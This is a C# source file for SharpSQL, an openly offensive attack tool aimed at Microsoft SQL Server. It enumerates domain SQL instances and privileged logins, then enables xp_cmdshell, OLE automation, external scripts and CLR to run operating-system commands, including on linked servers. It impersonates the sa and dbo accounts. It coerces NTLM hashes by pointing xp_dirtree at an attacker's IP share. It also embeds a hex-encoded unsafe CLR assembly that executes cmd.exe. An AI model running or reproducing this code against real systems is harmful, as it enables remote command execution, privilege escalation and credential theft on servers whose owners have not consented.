using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Data.SqlClient;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;


namespace SharpSQL
{
    class Program
    {
        public static void ShowHelp()
        {
            Console.WriteLine(
@"
SharpSQL by @mlcsec

Usage:

    SharpSQL.exe [Method] [-Instance <sql.server>] [-LinkedInstance <linked.sql.server>] [-Command <whoami>] [-Query <query>]

Options:

    -Instance                  - The instance to taget
    -db                        - The db to connect to (default: master)
    -LinkedInstance            - The linked instance to target
    -ip                        - The IP to xp_dirtree (share: /pwn)
    -User                      - The user to impersonate
    -Command                   - The command to execute (default: whoami - Invoke-OSCmd, Invoke-LinkedOSCmd, Invoke-ExternalScript, and Invoke-OLEObject)
    -Query                     - The raw SQL query to execute
    -help                      - Show help

Methods:
    Get-SQLInstanceDomain      - Get SQL instances within current domain via user and computer SPNs (no parameters required)
    Get-Databases              - Get available databases 
    Get-DBUser                 - Get database user via USER_NAME
    Get-GroupMembership        - Get group member for current user ('guest' or 'sysadmin')
    Get-Hash                   - Get hash via xp_dirtree, works nicely with impacket-ntlmrelayx
    Get-ImpersonableUsers      - Get impersonable users 
    Get-LinkedServers          - Get linked SQL servers
    Get-LinkedPrivs            - Get current user privs for linked server
    Get-Sysadmins              - Get sysadmin users
    Get-SystemUser             - Get system user via SYSTEM_USER
    Get-SQLQuery               - Execute raw SQL query
    Get-Triggers               - Get SQL server triggers
    Get-Users                  - Get users from syslogins
    Get-UserPrivs              - Get current user server privileges
    Check-Cmdshell             - Check whether xp_cmdshell is enabled on instance
    Check-LinkedCmdshell       - Check whether xp_cmdshell is enabled on linked server
    Clear-CLRAsm               - Drop procedure and assembly (run before Invoke-CLRAsm if previous error)
    Enable-Cmdshell            - Enable xp_cmdshell on instance
    Enable-LinkedCmdshell      - Enable xp_cmdshell on linked server
    Invoke-OSCmd               - Invoke xp_cmdshell on instance
    Invoke-LinkedOSCmd         - Invoke xp_cmdshell on linked server
    Invoke-ExternalScript      - Invoke external python script command execution 
    Invoke-OLEObject           - Invoke OLE wscript command execution
    Invoke-CLRAsm              - Invoke CLR assembly procedure command execution
    Invoke-UserImpersonation   - Impersonate user and execute query
    Invoke-DBOImpersonation    - Impersonate dbo on msdb and execute query

Examples:

    SharpSQL.exe Get-SQLInstanceDomain
    SharpSQL.exe Get-UserPrivs -Instance sql.server
    SharpSQL.exe Get-Sysadmins -Instance sql.server
    SharpSQL.exe Get-LinkedServers -Instance sql.server
    SharpSQL.exe Get-Hash -Instance sql.server -ip 10.10.10.10
    SharpSQL.exe Invoke-OSCmd -Instance sql.server -Command ""whoami /all""
    SharpSQL.exe Invoke-LinkedOSCmd -Instance sql.server -LinkedInstance linked.sql.server -Command ""dir C:\users\""
    SharpSQL.exe Invoke-CLRAsm -Instance sql.server -Command ""whoami && ipconfig""
");
        }

        static void ParseArgs(string[] args)
        {

            int iter = 0;

            foreach (string item in args)
            {
                switch (item)
                {
                    case "-Instance":
                    case "-instance":
                        Config.instance = args[iter + 1];
                        break;
                    case "-ip":
                        Config.ip = args[iter + 1];
                        break;
                    case "-db":
                        Config.db = args[iter + 1];
                        break;
                    case "-LinkedInstance":
                    case "-linkedinstance":
                        Config.linkedinstance = args[iter + 1];
                        break;
                    case "-User":
                    case "-user":
                        Config.user = args[iter + 1];
                        break;
                    case "-Command":
                    case "-command":
                        Config.command = args[iter + 1];
                        break;
                    case "-Query":
                    case "-query":
                        Config.query = args[iter + 1];
                        break;
                    default:
                        break;
                }
                ++iter;
            }
        }


        public static String executeQuery(String query, SqlConnection con)
        {
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();

            try
            {
                String result = "";
                while (reader.Read() == true)
                {
                    result += reader[0] + "\n";
                }
                reader.Close();
                return result;
            }
            catch
            {
                return "";
            }
        }



        public static void getGroupMembership(String groupToCheck, SqlConnection con)
        {
            String query = executeQuery($"SELECT IS_SRVROLEMEMBER('{groupToCheck}');", con);
            int role = int.Parse(query);

            if (role == 1)
            {
                Console.WriteLine($"'{groupToCheck}' group member");
            }
            else
            {
                Console.WriteLine($"not '{groupToCheck}' group member");
            }
        }



        public static void GetSQLInstanceDomain()
        {
            string[] spns = { };
            List<string> list = new List<string>(spns.ToList());
            using (var context = new PrincipalContext(ContextType.Domain))
            {
                using (var searcher = new PrincipalSearcher(new ComputerPrincipal(context)))
                {
                    foreach (var result in searcher.FindAll())
                    {
                        DirectoryEntry de = result.GetUnderlyingObject() as DirectoryEntry;
                        foreach (string spn in de.Properties["serviceprincipalname"])
                        {
                            Match cont = Regex.Match(spn, "MSSQL");
                            if (cont.Success)
                            {
                                list.Add(spn);
                            }
                        }
                    }
                }
            }

            using (var context = new PrincipalContext(ContextType.Domain))
            {
                using (var searcher = new PrincipalSearcher(new UserPrincipal(context)))
                {
                    foreach (var result in searcher.FindAll())
                    {
                        DirectoryEntry de = result.GetUnderlyingObject() as DirectoryEntry;
                        foreach (string spn in de.Properties["serviceprincipalname"])
                        {
                            Match cont = Regex.Match(spn, "MSSQL");
                            if (cont.Success)
                            {
                                list.Add(spn);
                            }
                        }
                    }
                }
            }

            spns = list.ToArray();
            Console.WriteLine("[*] Get-SQLInstanceDomain: ");
            foreach (var i in spns)
            {
                Console.WriteLine(i);
            }
        }



        static void Main(string[] args)
        {

            if (args.Length < 1)
            {
                ShowHelp();
                return;
            }

            if (args.Contains("-help"))
            {
                ShowHelp();
                return;
            }

            ParseArgs(args);


            string command = args[0];
            if (string.Equals(command, "Get-SQLInstanceDomain", StringComparison.CurrentCultureIgnoreCase))
            {
                GetSQLInstanceDomain();
                Environment.Exit(0);
            }


            if (string.IsNullOrEmpty(Config.instance))
            {
                Console.WriteLine("[!] No SQL instance supplied!");
                Environment.Exit(0);
            }


            string conStr = $"Server = {Config.instance}; Database = {Config.db}; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conStr);

            try
            {
                con.Open();
                Console.WriteLine($"[*] Authenticated to: {Config.instance}");
            }
            catch
            {
                Console.WriteLine($"[-] Authentication to: {Config.instance} failed");
                System.Environment.Exit(0);
            }


            /////////////////////////////////////////////////////////////////////////////////////////////////////
            // Enumeration

            if (string.Equals(command, "Get-Users", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT name FROM master..syslogins;", con);
                Console.WriteLine("[*] Get-Users: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Get-SystemUser", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT SYSTEM_USER;", con);
                Console.WriteLine("[*] Get-SystemUser: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Get-UserPrivs", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT permission_name FROM fn_my_permissions(NULL, 'SERVER');", con);
                Console.WriteLine("[*] Get-UserPrivs: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Get-Triggers", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT name FROM sys.server_triggers;", con);
                Console.WriteLine("[*] Get-Triggers: ");
                // can then disable the trigger: "disable trigger <trigger name> on all server"
                Console.WriteLine($"{query}");
            }



            else if (string.Equals(command, "Get-Sysadmins", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT name FROM master..syslogins WHERE sysadmin = '1';", con);
                Console.WriteLine("[*] Get-Sysadmins: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Get-DBUser", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT USER_NAME();", con);
                Console.WriteLine("[*] Get-DBUser: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Get-GroupMembership", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("[*] Get-GroupMembership: ");
                getGroupMembership("public", con);
                getGroupMembership("sysadmin", con);
            }


            else if (string.Equals(command, "Get-ImpersonableUsers", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
                Console.WriteLine("[*] Get-ImpersonableUsers: ");
                Console.WriteLine($"{query}");
            }



            else if (string.Equals(command, "Get-LinkedServers", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("EXEC sp_linkedservers;", con);
                Console.WriteLine("[*] Get-LinkedServers: ");
                Console.WriteLine($"{query}");
            }



            else if (string.Equals(command, "Get-Databases", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT * FROM sys.databases;", con);
                Console.WriteLine("[*] Get-Databases: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Get-SQLQuery", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.query))
                {
                    Console.WriteLine("[!] No query supplied!");
                    Console.WriteLine("SharpSQL.exe Get-SQLQurery -Instance sql.server -Query \"select @@servername\"");
                    Environment.Exit(0);
                }
                else
                {
                    string query = executeQuery($"{Config.query}", con);
                    Console.WriteLine("[*] Get-SQLQuery: ");
                    Console.WriteLine($"{query}");
                }
            }



            else if (string.Equals(command, "Check-Cmdshell", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("SELECT value FROM sys.configurations WHERE name ='xp_cmdshell';", con);
                Console.WriteLine("[*] Check-Cmdshell: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Check-LinkedCmdshell", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.linkedinstance))
                {
                    Console.WriteLine("[!] No linked instance supplied!");
                    Console.WriteLine("Usage: SharpSQL.exe Check-LinkedCmdshell -Instance sql.server -LinkedInstance linked.sql.server");
                    Environment.Exit(0);
                }
                else
                {

                    //string query = executeQuery($"EXEC ('SELECT value FROM sys.configurations WHERE name = ''xp_cmdshell''') AT [{Config.linkedinstance}];", con);  // RPC fail
                    string query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'SELECT value FROM sys.configurations WHERE name = ''xp_cmdshell''');", con);
                    Console.WriteLine("[*] Check-LinkedCmdshell: ");
                    Console.WriteLine($"{query}");
                }
            }


            else if (string.Equals(command, "Get-LinkedPrivs", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.linkedinstance))
                {
                    Console.WriteLine("[!] No linked instance supplied!");
                    Console.WriteLine("Usage: SharpSQL.exe Get-LinkedPrivs -Instance sql.server -LinkedInstance linked.sql.server");
                    Environment.Exit(0);
                }
                else
                {
                    string query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'SELECT permission_name FROM fn_my_permissions(NULL, ''SERVER'')');", con);
                    Console.WriteLine("[*] Get-LinkedPrivs: ");
                    Console.WriteLine($"{query}");
                }
            }


            else if (string.Equals(command, "Invoke-UserImpersonation", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.user) || (string.IsNullOrEmpty(Config.query)))
                {
                    Console.WriteLine("[!] No user or query supplied!");
                    Console.WriteLine("Usage: SharpSQL.exe Invoke-UserImpersonation -Instance sql.server -User sa -Query 'select user_name()'");
                    Environment.Exit(0);
                }

                else
                {
                    string query = executeQuery($"EXECUTE AS LOGIN = '{Config.user}';", con);
                    query = executeQuery($"{Config.query};", con);
                    Console.WriteLine("[*] Invoke-UserImpersonation: ");
                    Console.WriteLine($"{query}");
                }
            }


            else if (string.Equals(command, "Invoke-DBOImpersonation", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.query))
                {
                    Console.WriteLine("[!] No query supplied!");
                    Console.WriteLine("Usage: SharpSQL.exe Invoke-DBOImpersonation -Instance sql.server -Query 'select user_name()'");
                    Environment.Exit(0);
                }

                else
                {
                    string query = executeQuery($"use msdb; EXECUTE AS USER = 'dbo';", con);
                    query = executeQuery($"{Config.query};", con);
                    Console.WriteLine("[*] Invoke-DBOImpersonation: ");
                    Console.WriteLine($"{query}");
                }
            }







            /////////////////////////////////////////////////////////////////////////////////////////////////////
            // Code Execution

            else if (string.Equals(command, "Enable-CLR", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("use msdb;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security', 0;RECONFIGURE;", con);
                Console.WriteLine("[+] Enable-CLR: ");
                Console.WriteLine($"{query}");
            }




            else if (string.Equals(command, "Enable-Cmdshell", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
                query = executeQuery($"EXEC xp_cmdshell 'whoami'", con);
                Console.WriteLine("[+] Enable-Cmdshell: ");
                Console.WriteLine($"{query}");
            }



            else if (string.Equals(command, "Enable-LinkedCmdshell", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.linkedinstance))
                {
                    Console.WriteLine("[!] No linked instance supplied!");
                    Console.WriteLine("Usage: SharpSQL.exe Enable-LinkedCmdshell -Instance sql.server -LinkedInstance linked.sql.server");
                    Environment.Exit(0);
                }
                else
                {
                    //string query = executeQuery($"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [{Config.linkedinstance}];", con); // RPC fail
                    //query = executeQuery($"EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [{Config.linkedinstance}];", con);
                    //query = executeQuery($"EXEC ('xp_cmdshell ''whoami'';') AT [{Config.linkedinstance}];", con);

                    string query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'sp_configure ''show advanced options'', 1; reconfigure;');", con); // metadata error
                    query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'sp_configure ''xp_cmdshell'', 1; reconfigure;');", con);
                    query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'exec xp_cmdshell ''whoami'' WITH RESULT SETS ((output VARCHAR(MAX)))');", con);
                    Console.WriteLine("[*] Enable-LinkedCmdshell: ");
                    Console.WriteLine($"{query}");
                }
            }



            else if (string.Equals(command, "Get-Hash", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.ip))
                {
                    Console.WriteLine("[!] No ip supplied!");
                    Console.WriteLine("Usage: SharpSQL.exe Get-Hash -Instance sql.server -ip 10.10.10.10");
                    Environment.Exit(0);
                }
                else
                {
                    string query = executeQuery($"EXEC master..xp_dirtree '\\\\{Config.ip}\\pwn', 1, 1;", con);
                    Console.WriteLine("[*] Get-Hash");
                    Console.WriteLine($"[*] Check for hash at: {Config.ip}");
                }
            }


            else if (string.Equals(command, "Invoke-ExternalScript", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery("EXEC sp_configure 'external scripts enabled', 1; RECONFIGURE;", con);
                query = executeQuery($"EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system(\"{Config.command}\");';", con);
                Console.WriteLine("[*] Invoke-ExternalScript: ");
                Console.WriteLine($"{query}");
            }


            //EXECUTE AS LOGIN = 'sa';
            else if (string.Equals(command, "Invoke-OLEObject", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery($"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", con);
                query = executeQuery($"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{Config.command}';", con);
                Console.WriteLine("[*] Invoke-OLEObject: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Invoke-OSCmd", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery($"EXEC master..xp_cmdshell '{Config.command}';", con);
                Console.WriteLine("[*] Invoke-OSCmd: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Invoke-LinkedOSCmd", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.linkedinstance))
                {
                    Console.WriteLine("[!] No linkedinstance supplied!");
                    Console.WriteLine("Usage: SharpSQL.exe Invoke-LinkedOSCmd -Instance sql.server -LinkedInstance linked.sql.server");
                    Environment.Exit(0);
                }
                else
                {
                    //string query = executeQuery($"EXEC ('xp_cmdshell ''{Config.command}'';') AT [{Config.linkedinstance}];", con); // RPC fail 
                    string query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'exec xp_cmdshell ''{Config.command}'' WITH RESULT SETS ((output VARCHAR(MAX)))')", con);
                    Console.WriteLine("[*] Invoke-LinkedOSCmd: ");
                    Console.WriteLine($"{query}");
                }
            }


            else if (string.Equals(command, "Clear-CLRAsm", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery($"EXECUTE AS LOGIN = 'sa'; use msdb; DROP PROCEDURE cmdExec; DROP ASSEMBLY custom_asm", con);
                Console.WriteLine("[*] Clear-CLRAsm: ");
                Console.WriteLine($"{query}");
            }


            else if (string.Equals(command, "Invoke-CLRAsm", StringComparison.CurrentCultureIgnoreCase))
            {
                string query = executeQuery($"EXECUTE AS LOGIN = 'sa'; use msdb;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security', 0;RECONFIGURE;", con);
                query = executeQuery("CREATE ASSEMBLY custom_asm FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000005045000064860200DB0DDAEE0000000000000000F00022200B023000000C00000004000000000000000000000020000000000080010000000020000000020000040000000000000006000000000000000060000000020000000000000300608500004000000000000040000000000000000010000000000000200000000000000000000010000000000000000000000000000000000000000040000098030000000000000000000000000000000000000000000000000000E8290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000980A000000200000000C000000020000000000000000000000000000200000602E72737263000000980300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000D4080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E000024030000F403000023537472696E67730000000018070000580000002355530070070000100000002347554944000000800700005401000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F0000000100000001000000030000000000720201000000000006009C0127030600090227030600BA00F5020F00470300000600E2008B0206007F018B02060060018B020600F0018B020600BC018B020600D5018B0206000F018B020600CE0008030600AC000803060043018B0206002A013B020600880384020A00F900D4020A00550256030E006B03F5020A007000D4020E00AB02F50206006B0284020A002E00D4020A009C0022000A00DA03D4020A009400D4020600BC0218000600C9021800000000000F000000000001000100010010000100000041000100010048200000000096004300620001000921000000008618EF02060002000000010064000900EF0201001100EF0206001900EF020A002900EF0210003100EF0210003900EF0210004100EF0210004900EF0210005100EF0210005900EF0210006100EF0215006900EF0210007100EF0210007900EF0210008900EF0206009900EF02060099009D022100A9007E001000B10081032600A90073031000A90027021500A900BF0315009900A6032C00B900EF023000A100EF023800C9008B003F00D1009B0344009900AC034A00E1004B004F0081005F024F00A10068025300D100E5034400D1005500060099008F0306009900A60006008100EF02060020007B004F012E000B0068002E00130071002E001B0090002E00230099002E002B00AC002E003300AC002E003B00AC002E00430099002E004B00B2002E005300AC002E005B00AC002E006300CA002E006B00F4002E00730001011A000480000001000000000000000000000000000100000004000000000000000000000059003A000000000004000000000000000000000059002200000000000400000000000000000000005900840200000000000000436C6173734C69627261727931003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E6700436C6173734C696272617279312E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F00750074007000750074000000169A0EF308EDAE4488DDF91E9E5F0CC100042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000001201000D436C6173734C69627261727931000005010000000017010012436F7079726967687420C2A920203230323200002901002437346636623964642D613933642D343766652D393138362D33333337633062313662306300000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E320401000000000000009F5A2B82000000000200000078000000202A0000200C0000000000000000000000000000100000000000000000000000000000005253445335FFE90FDD5F32458E79AA0AF33EF07101000000433A5C55736572735C61646D696E2E434F5250315C736F757263655C7265706F735C436C6173734C696272617279315C436C6173734C696272617279315C6F626A5C7836345C52656C656173655C436C6173734C696272617279312E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000003C03000000000000000000003C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0049C020000010053007400720069006E006700460069006C00650049006E0066006F0000007802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D006500000000000000000044000E000100460069006C0065004400650073006300720069007000740069006F006E000000000043006C006100730073004C0069006200720061007200790031000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000044001200010049006E007400650072006E0061006C004E0061006D006500000043006C006100730073004C0069006200720061007200790031002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200320000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000004C00120001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000043006C006100730073004C0069006200720061007200790031002E0064006C006C0000003C000E000100500072006F0064007500630074004E0061006D0065000000000043006C006100730073004C0069006200720061007200790031000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;", con);
                query = executeQuery("CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [custom_asm].[ClassLibrary1].[cmdExec];", con);
                query = executeQuery($"EXEC cmdExec '{Config.command}'", con);
                Console.WriteLine("[*] Invoke-CLRAsm: ");
                Console.WriteLine($"{query}");
                executeQuery("DROP PROCEDURE cmdExec; DROP ASSEMBLY custom_asm;", con);
            }


            else
            {
                ShowHelp();
                return;
            }
        }
    }
}
